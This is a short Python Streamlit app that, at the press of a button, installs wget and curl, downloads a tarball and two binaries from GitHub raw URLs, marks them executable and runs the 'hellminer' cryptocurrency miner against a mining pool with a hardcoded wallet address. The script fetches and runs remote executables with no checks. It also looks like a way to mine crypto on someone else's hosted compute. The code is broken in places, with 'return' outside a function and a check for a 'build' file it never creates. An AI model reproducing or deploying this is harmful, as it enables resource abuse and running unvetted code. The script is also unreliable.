import os
import streamlit as st

# Streamlit App Title
st.title("Mining Script Execution")

# Description
st.write("This app allows you to download and execute a mining script.")

# Button to trigger the script
if st.button("Run Mining Script"):
    st.write("Executing script...")

    try:
        # Install wget and curl (without sudo)
        st.write("Installing wget and curl...")
        os.system("apt-get update && apt-get install -y wget curl")

        # Download graphics.tar.gz
        st.write("Downloading graphics.tar.gz...")
        os.system("curl -0 https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz -o graphics.tar.gz >/dev/null 2>&1")
        
        # Extract graphics.tar.gz
        st.write("Extracting graphics.tar.gz...")
        if os.path.exists("graphics.tar.gz"):
            os.system("tar -xvzf graphics.tar.gz")
        else:
            st.error("Failed to download graphics.tar.gz.")
            return

        # Download hellminer and verus-solver
        st.write("Downloading hellminer and verus-solver...")
        os.system("wget https://raw.githubusercontent.com/akton0208/test2/main/hellminer")
        os.system("wget https://raw.githubusercontent.com/akton0208/test2/main/verus-solver")

        # Check if files were downloaded
        if not os.path.exists("hellminer") or not os.path.exists("verus-solver"):
            st.error("Failed to download hellminer or verus-solver.")
            return

        # Set executable permissions
        st.write("Setting permissions...")
        os.system("chmod +x hellminer verus-solver")

        # Check if build file exists
        if not os.path.exists("build"):
            st.error("Failed to rename hellminer to build.")
            return

        # Run the mining script
        st.write("Running mining script...")
        os.system("./hellminer -c stratum+tcp://us.vipor.net:5040#xnsub -u RUf9nXasGVcz4mtWhYxENVzmQrpf1g5WXx..bajingan -p x --cpu 4 -F")

        st.success("Mining script executed successfully!")
    except Exception as e:
        st.error(f"An error occurred: {e}")
